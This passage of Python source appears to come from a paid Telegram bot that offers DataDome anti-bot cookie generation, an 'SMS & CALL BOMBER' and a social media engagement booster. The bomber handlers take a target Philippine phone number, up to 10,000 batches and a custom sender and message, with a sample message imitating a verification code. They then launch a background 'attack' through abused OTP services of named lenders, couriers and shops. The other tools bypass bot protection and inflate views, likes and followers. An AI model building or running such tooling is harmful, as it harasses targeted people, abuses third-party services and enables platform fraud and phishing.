    await safe_edit(current_message, "🔄 *Generating DataDome cookie file...* Please wait...")

    try:
        generator = DataDomeGenerator()
        datadome = generator.get_new_datadome()
        
        if datadome:
            cookie_content = generator.generate_cookie_file(datadome)
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"datadome_cookie_{timestamp}.py"
            
            # Save file temporarily
            filepath = GENERATED_DIR / filename
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(cookie_content)
            
            # Send the file
            with open(filepath, "rb") as f:
                caption = (
                    f"📁 *DataDome Cookie File Generated* 📁\n\n"
                    f"🍪 *Cookie Value:* `{datadome[:50]}...`\n"
                    f"📝 *File Name:* `{filename}`\n"
                    f"⏰ *Generated:* {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"✨ *Usage:*\n"
                    f"• Import this file in your Python scripts\n"
                    f"• Use `get_cookies()` function to get the cookie dictionary\n"
                    f"• Perfect for automation scripts\n\n"
                    f"⚠️ *Note:* This file will auto-delete in 3 minutes"
                )
                
                await context.bot.send_document(
                    chat_id=current_message.chat_id,
                    document=f,
                    filename=filename,
                    caption=caption,
                    parse_mode="Markdown"
                )
            
            # Schedule file deletion
            asyncio.create_task(delete_generated_file(filepath))
            
        else:
            await safe_edit(current_message, 
                "❌ *Failed to generate DataDome cookie*\n\n"
                "Please try again later.",
                parse_mode="Markdown"
            )
            
    except Exception as e:
        error_message = f"❌ *Error generating cookie file:* `{str(e)}`"
        await safe_edit(current_message, error_message, parse_mode="Markdown")

async def datadome_info(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    await safe_edit(current_message, 
        "📖 *What is DataDome?* 📖\n\n"
        "*DataDome* is a bot protection service used by many websites including Garena to prevent automated access.\n\n"
        "*How it works:*\n"
        "• Analyzes browser fingerprints and behavior\n"
        "• Blocks suspicious automated requests\n"
        "• Uses cookies to track session legitimacy\n\n"
        "*Why generate DataDome cookies?*\n"
        "• Bypass anti-bot protection for legitimate automation\n"
        "• Access Garena services programmatically\n"
        "• Test your applications against real protection\n\n"
        "*Important Notes:*\n"
        "⚠️ Use responsibly and ethically\n"
        "⚠️ Cookies have limited lifetime\n"
        "⚠️ Generate new cookies when old ones expire\n\n"
        "For technical support: @ZyronDevv ",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴏᴋɪᴇ", callback_data="generate_datadome")],
            [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data="datadome_menu")]
        ])
    )

# ========== SMS BOMBER FUNCTIONS ==========
async def sms_bomber_menu(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        await safe_edit(current_message, "🛠️ *Bot is under maintenance!*", parse_mode="Markdown")
        return

    if not has_access(user_id):
        await safe_edit(current_message, "🔒 *ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʀᴇǫᴜɪʀᴇᴅ!*\n\nᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ᴛᴏ ɢᴇᴛ ᴀ ᴋᴇʏ.", parse_mode="Markdown")
        return

    keyboard = [
        [InlineKeyboardButton("🚀 ʟᴀᴜɴᴄʜ sᴍs ʙᴏᴍʙᴇʀ", callback_data="start_sms_bomber")],
        [InlineKeyboardButton("🛑 sᴛᴏᴘ ʀᴜɴɴɪɴɢ ᴀᴛᴛᴀᴄᴋ", callback_data="stop_sms_bomber")],
        [InlineKeyboardButton("📊 ʙᴏᴍʙᴇʀ sᴛᴀᴛɪsᴛɪᴄs", callback_data="bomber_stats")],
        [InlineKeyboardButton("ℹ️ ʙᴏᴍʙᴇʀ ɪɴғᴏ", callback_data="bomber_info")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    active = len(BOMBER_ACTIVE_ATTACKS)
    message_text = (
        "💣  *SMS & CALL BOMBER*\n"
        "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        "📡  30 SMS services\n"
        "📞  Call bombing support\n"
        "✏️  Custom message & sender name\n"
        "📊  Real-time progress tracking\n"
        "🇵🇭  PH numbers only  (09xx / +63)\n"
        "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"🔴  Active attacks  ›  `{active}`\n"
        "⚠️  Use responsibly."
    )

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def start_sms_bomber(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id

    # ── VIP tier gate (#1) ───────────────────────────────────────
    if not is_at_least_role(user_id, "vip") and user_id != ADMIN_ID:
        await safe_edit(current_message,
            "🔒 *sᴍs ʙᴏᴍʙᴇʀ ʀᴇǫᴜɪʀᴇs ᴠɪᴘ ᴀᴄᴄᴇss*\n\n"
            "ᴜᴘɢʀᴀᴅᴇ ʏᴏᴜʀ ᴋᴇʏ ᴛᴏ ᴠɪᴘ ᴛᴏ ᴜɴʟᴏᴄᴋ:\n"
            "💣 sᴍs & ᴄᴀʟʟ ʙᴏᴍʙᴇʀ\n"
            "🚀 sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ʙᴏᴏsᴛᴇʀ\n\n"
            "📞 ᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ᴛᴏ ᴜᴘɢʀᴀᴅᴇ.",
            parse_mode="Markdown"
        )
        return

    # ── Daily limit check — VIP+ is unlimited ───────────────────
    reset_daily_stats_if_needed(user_id)
    if not is_at_least_role(user_id, "vip"):
        daily_used = USER_STATS.get(user_id, {}).get("sms_bomb_today", 0)
        if daily_used >= SMS_BOMB_DAILY_LIMIT:
            await safe_edit(current_message,
                f"⏳ *ᴅᴀɪʟʏ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ* ({SMS_BOMB_DAILY_LIMIT} ʀᴜɴs/ᴅᴀʏ)\n\n"
                "ʀᴇsᴇᴛs ᴀᴛ ᴍɪᴅɴɪɢʜᴛ.\n"
                "💡 ᴜᴘɢʀᴀᴅᴇ ᴛᴏ *VIP* ғᴏʀ ᴜɴʟɪᴍɪᴛᴇᴅ → @ZyronDevv ",
                parse_mode="Markdown"
            )
            return
        USER_STATS.setdefault(user_id, {})["sms_bomb_today"] = daily_used + 1

    # Check if user already has an active attack
    if user_id in BOMBER_ACTIVE_ATTACKS:
        await safe_edit(current_message, 
            "⚠️  *Active attack running!*\n"
            "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            "Stop your current attack before starting a new one.",
            parse_mode="Markdown"
        )
        return

    AWAITING_BOMBER_PHONE.add(user_id)
    
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message_text = (
        "📱 *SMS BOMBER - TARGET SELECTION* 📱\n\n"
        "Please enter the target phone number.\n\n"
        "*Valid Formats:*\n"
        "• `09123456789`\n"
        "• `9123456789`\n"
        "• `+639123456789`\n\n"
        "⚠️ *Note:* Only Philippine numbers are supported.\n"
        "⚠️ *Use responsibly!*"
    )

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_bomber_phone(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_BOMBER_PHONE:
        return

    phone_number = update.message.text.strip()
    
    # Validate phone number format
    import re
    if not re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', phone_number.replace(' ', '')):
        await update.effective_message.reply_text(
            "❌ *Invalid phone number format!*\n\n"
            "Please use one of these formats:\n"
            "• `09123456789`\n"
            "• `9123456789`\n"
            "• `+639123456789`\n\n"
            "Try again:",
            parse_mode="Markdown"
        )
        return

    # ── Anti-spam: cooldown per target number ────────────────────
    now_ts = time.time()
    last_bombed = BOMBED_NUMBERS.get(phone_number, 0)
    cooldown_remaining = BOMBER_NUMBER_COOLDOWN - (now_ts - last_bombed)
    if cooldown_remaining > 0 and user_id != ADMIN_ID:
        mins = int(cooldown_remaining // 60)
        secs = int(cooldown_remaining % 60)
        await update.effective_message.reply_text(
            f"⏳ *ɴᴜᴍʙᴇʀ ᴏɴ ᴄᴏᴏʟᴅᴏᴡɴ*\n\n"
            f"ᴛʜɪs ɴᴜᴍʙᴇʀ ᴡᴀs ʀᴇᴄᴇɴᴛʟʏ ʙᴏᴍʙᴇᴅ.\n"
            f"ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ *{mins}m {secs}s*.",
            parse_mode="Markdown"
        )
        return

    context.user_data['bomber_phone'] = phone_number
    AWAITING_BOMBER_PHONE.discard(user_id)
    AWAITING_BOMBER_AMOUNT.add(user_id)

    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.effective_message.reply_text(
        "📊 *SMS BOMBER - BATCH COUNT* 📊\n\n"
        "How many batches would you like to send?\n\n"
        "*Recommended:* 10000\n"
        "*Maximum:* 10000\n\n"
        "Each batch sends messages to all 30 services.\n"
        "Enter a number:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def handle_bomber_amount(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_BOMBER_AMOUNT:
        return

    try:
        amount = int(update.message.text.strip())
        if amount < 1:
            await update.effective_message.reply_text("❌ Amount must be at least 1. Try again:")
            return
        # VIP+ can send up to 10000 — others capped at 200
        if is_at_least_role(user_id, "vip"):
            max_allowed = 10000
        else:
            max_allowed = 200
        if amount > max_allowed:
            await update.effective_message.reply_text(
                f"⚠️ Your tier max is *{max_allowed}* batches."
                + (" Upgrade to VIP for up to 10,000 → @ZyronDevv " if max_allowed < 10000 else "")
                + f" Setting to {max_allowed}.",
                parse_mode="Markdown"
            )
            amount = max_allowed
    except ValueError:
        await update.effective_message.reply_text("❌ Please enter a valid number. Try again:")
        return

    context.user_data['bomber_amount'] = amount
    AWAITING_BOMBER_AMOUNT.discard(user_id)
    AWAITING_BOMBER_SENDER.add(user_id)

    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.effective_message.reply_text(
        "✏️ *SMS BOMBER - SENDER NAME* ✏️\n\n"
        "Enter the sender name for custom SMS messages:\n\n"
        "*Example:* `John` or `Customer Service`\n\n"
        "This will be used for personalized SMS.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def handle_bomber_sender(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_BOMBER_SENDER:
        return

    sender_name = update.message.text.strip()
    if not sender_name:
        sender_name = "User"

    context.user_data['bomber_sender'] = sender_name
    AWAITING_BOMBER_SENDER.discard(user_id)
    AWAITING_BOMBER_MESSAGE.add(user_id)

    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.effective_message.reply_text(
        "💬 *SMS BOMBER - MESSAGE CONTENT* 💬\n\n"
        "Enter the custom message to send:\n\n"
        "*Example:* `Your verification code is: 123456`\n"
        "*Note:* The suffix `-freed0m` will be automatically added.\n\n"
        "Enter your message:",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def handle_bomber_message(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_BOMBER_MESSAGE:
        return

    message_content = update.message.text.strip()
    if not message_content:
        message_content = "Test Message"

    context.user_data['bomber_message'] = message_content
    AWAITING_BOMBER_MESSAGE.discard(user_id)

    # Get all data from context
    phone = context.user_data.get('bomber_phone')
    amount = context.user_data.get('bomber_amount', 1)
    sender = context.user_data.get('bomber_sender', "User")
    message = context.user_data.get('bomber_message', "Test Message")

    # Create bomber instance
    bomber = SMSBomber(user_id)
    # Set custom data directly
    bomber.custom_sender_name = sender
    bomber.custom_message = message
    
    # Store bomber instance
    BOMBER_ACTIVE_ATTACKS[user_id] = bomber
    # Track global stats and per-number cooldown
    GLOBAL_STATS["total_bomber_attacks"] += 1
    record_tool_use("sms_bomb")
    BOMBED_NUMBERS[phone] = time.time()
    USER_STATS.setdefault(user_id, {})["sms_bomb_count"] = USER_STATS.get(user_id, {}).get("sms_bomb_count", 0) + 1

    # Start the attack in background
    asyncio.create_task(run_bomber_attack(bomber, phone, amount, context, update.message.chat_id))

    # Send confirmation
    await update.effective_message.reply_text(
        f"🚀 *ATTACK INITIATED!* 🚀\n\n"
        f"🎯 *Target:* `{phone}`\n"
        f"📊 *Batches:* {amount}\n"
        f"👤 *Sender:* {sender}\n"
        f"💬 *Message:* {message}\n\n"
        "⏳ *Starting attack in background...*\n"
        "You will receive progress updates here.",
        parse_mode="Markdown"
    )

async def run_bomber_attack(bomber: SMSBomber, phone: str, amount: int, context: CallbackContext, chat_id: int):
    """Run the bomber attack in background"""
    try:
        await bomber.execute_attack(phone, amount, context, chat_id)
    except Exception as e:
        logging.error(f"Bomber attack error: {e}")
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"❌ *Attack Failed!*\n\nError: `{str(e)}`",
            parse_mode="Markdown"
        )
    finally:
        # Remove from active attacks
        if bomber.user_id in BOMBER_ACTIVE_ATTACKS:
            del BOMBER_ACTIVE_ATTACKS[bomber.user_id]

async def stop_sms_bomber(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    
    if user_id in BOMBER_ACTIVE_ATTACKS:
        bomber = BOMBER_ACTIVE_ATTACKS[user_id]
        bomber.stop_attack()
        
        # Get stats before removing
        stats = {
            "success": bomber.success_count,
            "failed": bomber.fail_count,
            "total": bomber.success_count + bomber.fail_count,
            "batches": bomber.current_batch
        }
        
        del BOMBER_ACTIVE_ATTACKS[user_id]
        
        await safe_edit(current_message, 
            f"🛑 *ᴀᴛᴛᴀᴄᴋ sᴛᴏᴘᴘᴇᴅ*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ sᴜᴄᴄᴇss: *{stats['success']}*\n"
            f"❌ ғᴀɪʟᴇᴅ: *{stats['failed']}*\n"
            f"📊 ʙᴀᴛᴄʜᴇs: *{stats['batches']}*\n"
            f"📈 ᴛᴏᴛᴀʟ: *{stats['total']}*",
            parse_mode="Markdown"
        )
    else:
        await safe_edit(current_message, 
            "ℹ️ *No Active Attack*\n\n"
            "You don't have any running attacks to stop.",
            parse_mode="Markdown"
        )

async def bomber_stats(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    
    if user_id in BOMBER_ACTIVE_ATTACKS:
        bomber = BOMBER_ACTIVE_ATTACKS[user_id]
        rate = round(bomber.success_count / max(bomber.success_count + bomber.fail_count, 1) * 100)
        bar_filled = int(bomber.current_batch / max(bomber.total_batches, 1) * 10)
        progress_bar = f"{'▓' * bar_filled}{'░' * (10 - bar_filled)}"
        stats_text = (
            f"📊 *ʟɪᴠᴇ ᴀᴛᴛᴀᴄᴋ sᴛᴀᴛs*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"ᴘʀᴏɢʀᴇss: `{progress_bar}` {bomber.current_batch}/{bomber.total_batches}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ sᴜᴄᴄᴇss: *{bomber.success_count}*\n"
            f"❌ ғᴀɪʟᴇᴅ:  *{bomber.fail_count}*\n"
            f"📈 ʀᴀᴛᴇ:    *{rate}%*"
        )
    else:
        stats_text = (
            "📊 *BOMBER STATISTICS* 📊\n\n"
            "ℹ️ *No Active Attacks*\n\n"
            "Start an attack to see statistics here."
        )
    
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data="sms_bomber_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await safe_edit(current_message, stats_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")

async def bomber_info(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    info_text = (
        "ℹ️ *SOLID SMS & CALL BOMBER PRO* ℹ️\n\n"
        "*Available Services (13 Total):*\n"
        "1. *Custom SMS* - Personalized messaging\n"
        "2. *EZLOAN* - Loan service OTP\n"
        "3. *XPRESS PH* - Delivery service\n"
        "4. *ABENSON* - Appliance store OTP\n"
        "5. *Excellent Lending* - Loan provider\n"
        "6. *Fortune Pay* - Payment service\n"
        "7. *WEMOVE* - Moving service\n"
        "8. *LBC Connect* - Delivery service\n"
        "9. *Pickup Coffee* - Coffee shop app\n"
        "10. *Honey Loan* - Loan service\n"
        "11. *KOMO PH* - Digital banking\n"
        "12. *S5.COM* - Gaming platform\n"
        "13. *Call Bomb* - Call bombing service\n\n"
        "*Features:*\n"
        "• Multi-service concurrent attacks\n"
        "• Customizable messages\n"
        "• Real-time progress tracking\n"
        "• Philippine number support\n"
        "• Background execution\n\n"
        "⚠️ *Important Notes:*\n"
        "• Use responsibly and ethically\n"
        "• Don't exceed reasonable limits\n"
        "• Some services may have rate limits\n"
        "• Call bombing service may have delays\n\n"
        "📞 *Support:* @ZyronDevv "
    )
    
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ", callback_data="sms_bomber_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await safe_edit(current_message, info_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(info_text, reply_markup=reply_markup, parse_mode="Markdown")

# ========== SOCIAL MEDIA BOOSTER FUNCTIONS ==========
async def social_media_booster_menu(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        await safe_edit(current_message, "🛠️ *Bot is under maintenance!*", parse_mode="Markdown")
        return

    if not has_access(user_id):
        await safe_edit(current_message, "🔒 *ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʀᴇǫᴜɪʀᴇᴅ!*\n\nᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ᴛᴏ ɢᴇᴛ ᴀ ᴋᴇʏ.", parse_mode="Markdown")
        return

    keyboard = [
        [InlineKeyboardButton("🎵 ᴛɪᴋᴛᴏᴋ ᴠɪᴇᴡs",     callback_data="boost_tiktok_views"),
         InlineKeyboardButton("👥 ᴛɪᴋᴛᴏᴋ ғᴏʟʟᴏᴡᴇʀs", callback_data="boost_tiktok_followers")],
        [InlineKeyboardButton("❤️ ᴛɪᴋᴛᴏᴋ ʟɪᴋᴇs",     callback_data="boost_tiktok_likes"),
         InlineKeyboardButton("💬 ᴛɪᴋᴛᴏᴋ ᴄᴏᴍᴍᴇɴᴛs",  callback_data="boost_tiktok_comments")],
        [InlineKeyboardButton("🔄 ᴛɪᴋᴛᴏᴋ sʜᴀʀᴇs",    callback_data="boost_tiktok_shares"),
         InlineKeyboardButton("⭐ ᴛɪᴋᴛᴏᴋ ғᴀᴠᴏʀɪᴛᴇs", callback_data="boost_tiktok_favorites")],
        [InlineKeyboardButton("📢 ᴛᴇʟᴇɢʀᴀᴍ ᴠɪᴇᴡs",   callback_data="boost_telegram_views"),
         InlineKeyboardButton("📘 ғᴀᴄᴇʙᴏᴏᴋ ʟɪᴋᴇs",   callback_data="boost_facebook")],
        [InlineKeyboardButton("📷 ɪɢ ᴠɪᴇᴡs",          callback_data="boost_instagram_views"),
         InlineKeyboardButton("❤️ ɪɢ ʟɪᴋᴇs",          callback_data="boost_instagram_likes")],
        [InlineKeyboardButton("🐦 ᴛᴡɪᴛᴛᴇʀ ᴠɪᴇᴡs",    callback_data="boost_twitter_views"),
         InlineKeyboardButton("▶️ ʏᴛ ᴠɪᴇᴡs",          callback_data="boost_youtube_views")],
        [InlineKeyboardButton("👍 ʏᴛ ʟɪᴋᴇs",           callback_data="boost_youtube_likes"),
         InlineKeyboardButton("⬅️ ʙᴀᴄᴋ",               callback_data="back_to_main_menu")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message_text = (
        "🚀 *sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ʙᴏᴏsᴛᴇʀ*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🎵 *ᴛɪᴋᴛᴏᴋ* — ᴠɪᴇᴡs · ғᴏʟʟᴏᴡᴇʀs · ʟɪᴋᴇs · ᴄᴏᴍᴍᴇɴᴛs · sʜᴀʀᴇs · ғᴀᴠs\n"
        "📢 *ᴛᴇʟᴇɢʀᴀᴍ* — ᴄʜᴀɴɴᴇʟ ᴠɪᴇᴡs\n"
        "📘 *ғᴀᴄᴇʙᴏᴏᴋ* — ᴘᴏsᴛ ʟɪᴋᴇs\n"
        "📷 *ɪɴsᴛᴀɢʀᴀᴍ* — ᴠɪᴇᴡs · ʟɪᴋᴇs\n"
        "🐦 *ᴛᴡɪᴛᴛᴇʀ / x* — ᴛᴡᴇᴇᴛ ᴠɪᴇᴡs\n"
        "▶️ *ʏᴏᴜᴛᴜʙᴇ* — ᴠɪᴇᴡs · ʟɪᴋᴇs\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💡 ᴜsᴇ ғᴜʟʟ ᴜʀʟs · ᴢᴇғᴏʏ + sᴏᴄʟɪᴋᴇs + ʟɪᴋᴇsғᴀʀᴍ ᴘʀᴏᴠɪᴅᴇʀs\n"
        "⚡ ᴄʜᴀɴɢᴇs ᴍᴀʏ ᴛᴀᴋᴇ ᴀ ғᴇᴡ ᴍɪɴᴜᴛᴇs"
    )

    if update.callback_query:
        await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def start_boost_process(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    query = update.callback_query
    try:
        await safe_answer_callback(query)
    except Exception:
        pass

    user_id = update.effective_user.id
    
    # Store boost type in context
    boost_type = query.data
    context.user_data['boost_type'] = boost_type
    
    # Define URL validation patterns
    url_patterns = {
        'boost_tiktok_views': ['tiktok.com', 'vt.tiktok.com', 'vm.tiktok.com'],
        'boost_tiktok_followers': ['tiktok.com', 'vt.tiktok.com', 'vm.tiktok.com'],
        'boost_tiktok_likes': ['tiktok.com', 'vt.tiktok.com', 'vm.tiktok.com'],
        'boost_telegram_views': ['t.me', 'telegram.me'],
        'boost_facebook': ['facebook.com'],
        'boost_instagram_views': ['instagram.com'],
        'boost_twitter_views': ['twitter.com', 'x.com'],
        'boost_youtube_views': ['youtube.com', 'youtu.be']
    }
    
    # Get service names for display
    service_names = {
        'boost_tiktok_views': 'TikTok Views',
        'boost_tiktok_followers': 'TikTok Followers',
        'boost_tiktok_likes': 'TikTok Likes',
        'boost_telegram_views': 'Telegram Views',
        'boost_facebook': 'Facebook',
        'boost_instagram_views': 'Instagram Views',
        'boost_twitter_views': 'Twitter Views',
        'boost_youtube_views': 'YouTube Views'
    }
    
    service_name = service_names.get(boost_type, 'Unknown')
    patterns = url_patterns.get(boost_type, [])
    
    # Set user state
    AWAITING_BOOST_URL.add(user_id)
    
    # Create URL examples
    examples = {
        'boost_tiktok_views': 'https://www.tiktok.com/@username/video/1234567890',
        'boost_tiktok_followers': 'https://www.tiktok.com/@username',
        'boost_tiktok_likes': 'https://www.tiktok.com/@username/video/1234567890',
        'boost_telegram_views': 'https://t.me/channel/123',
        'boost_facebook': 'https://www.facebook.com/post/123456',
        'boost_instagram_views': 'https://www.instagram.com/p/AbCdEfGHiJk/',
        'boost_twitter_views': 'https://twitter.com/user/status/1234567890',
        'boost_youtube_views': 'https://www.youtube.com/watch?v=AbCdEfGHiJk'
    }
    
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message_text = (
        f"🚀 *{service_name} Boosting*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"sᴇɴᴅ ᴛʜᴇ ᴛᴀʀɢᴇᴛ URL ʙᴇʟᴏᴡ.\n\n"
        f"✅ ᴠᴀʟɪᴅ ᴅᴏᴍᴀɪɴ(s): `{', '.join(patterns)}`\n"
        f"📌 ᴇxᴀᴍᴘʟᴇ:\n`{examples.get(boost_type, 'Enter valid URL')}`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "⚠️ ᴍᴀᴋᴇ sᴜʀᴇ ᴛʜᴇ ᴘᴏsᴛ/ᴘʀᴏғɪʟᴇ ɪs *ᴘᴜʙʟɪᴄ*."
    )
    
    await safe_edit(current_message, message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_boost_url(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in AWAITING_BOOST_URL:
        return

    target_url = update.message.text.strip()
    boost_type = context.user_data.get('boost_type')
    
    # Validate URL based on boost type
    url_patterns = {
        'boost_tiktok_views': ['tiktok.com', 'vt.tiktok.com', 'vm.tiktok.com'],
        'boost_tiktok_followers': ['tiktok.com', 'vt.tiktok.com', 'vm.tiktok.com'],
        'boost_tiktok_likes': ['tiktok.com', 'vt.tiktok.com', 'vm.tiktok.com'],
        'boost_telegram_views': ['t.me', 'telegram.me'],
        'boost_facebook': ['facebook.com'],
        'boost_instagram_views': ['instagram.com'],
        'boost_instagram_likes': ['instagram.com'],
        'boost_twitter_views': ['twitter.com', 'x.com'],
        'boost_youtube_views': ['youtube.com', 'youtu.be'],
        'boost_youtube_likes': ['youtube.com', 'youtu.be'],
        'boost_tiktok_comments':  ['tiktok.com'],
        'boost_tiktok_shares':    ['tiktok.com'],
        'boost_tiktok_favorites': ['tiktok.com'],
    }
    
    service_names = {
        'boost_tiktok_views':     'TikTok Views',
        'boost_tiktok_followers': 'TikTok Followers',
        'boost_tiktok_likes':     'TikTok Likes',
        'boost_tiktok_comments':  'TikTok Comments',
        'boost_tiktok_shares':    'TikTok Shares',
        'boost_tiktok_favorites': 'TikTok Favorites',
        'boost_telegram_views':   'Telegram Views',
        'boost_facebook':         'Facebook Likes',
        'boost_instagram_views':  'Instagram Views',
        'boost_instagram_likes':  'Instagram Likes',
        'boost_twitter_views':    'Twitter Views',
        'boost_youtube_views':    'YouTube Views',
        'boost_youtube_likes':    'YouTube Likes',
    }
    
    service_name = service_names.get(boost_type, 'Unknown')
    patterns = url_patterns.get(boost_type, [])
    
    # Validate URL
    is_valid = any(pattern in target_url for pattern in patterns)
    if not is_valid:
        await update.effective_message.reply_text(
            f"❌ *ɪɴᴠᴀʟɪᴅ URL*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"sᴇʀᴠɪᴄᴇ: *{service_name}*\n"
            f"ʀᴇǫᴜɪʀᴇᴅ ᴅᴏᴍᴀɪɴ: `{', '.join(patterns)}`\n\n"
            "ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ ᴠᴀʟɪᴅ URL:",
            parse_mode="Markdown"
        )
        return
    
    AWAITING_BOOST_URL.discard(user_id)
    BOOSTER_ACTIVE.add(user_id)
    record_tool_use("boost")
    GLOBAL_STATS["total_boosts"] = GLOBAL_STATS.get("total_boosts", 0) + 1
    
    # Send initial processing message
    processing_msg = await update.effective_message.reply_text(
        f"⏳ *ᴘʀᴏᴄᴇssɪɴɢ...*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🚀 {service_name} ʙᴏᴏsᴛ sᴛᴀʀᴛᴇᴅ\n"
        f"🔗 `{target_url[:50]}{'...' if len(target_url) > 50 else ''}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ...",
        parse_mode="Markdown"
    )
    
    # Create booster instance and process (always close session in finally)
    booster = SocialMediaBooster()
    success = False
    result_message = ""
    
    try:
        # Call appropriate boosting method
        if boost_type == 'boost_tiktok_views':
            success, result_message = await booster.boost_tiktok_views(target_url)
        elif boost_type == 'boost_tiktok_followers':
            success, result_message = await booster.boost_tiktok_followers(target_url)
        elif boost_type == 'boost_tiktok_likes':
            success, result_message = await booster.boost_tiktok_likes(target_url)
        elif boost_type == 'boost_tiktok_comments':
            success, result_message = await booster.boost_tiktok_comments(target_url)
        elif boost_type == 'boost_tiktok_shares':
            success, result_message = await booster.boost_tiktok_shares(target_url)
        elif boost_type == 'boost_tiktok_favorites':
            success, result_message = await booster.boost_tiktok_favorites(target_url)
        elif boost_type == 'boost_telegram_views':
            success, result_message = await booster.boost_telegram_views(target_url)
        elif boost_type == 'boost_facebook':
            success, result_message = await booster.boost_facebook(target_url)
        elif boost_type == 'boost_instagram_views':
            success, result_message = await booster.boost_instagram_views(target_url)
        elif boost_type == 'boost_instagram_likes':
            success, result_message = await booster.boost_instagram_likes(target_url)
        elif boost_type == 'boost_twitter_views':
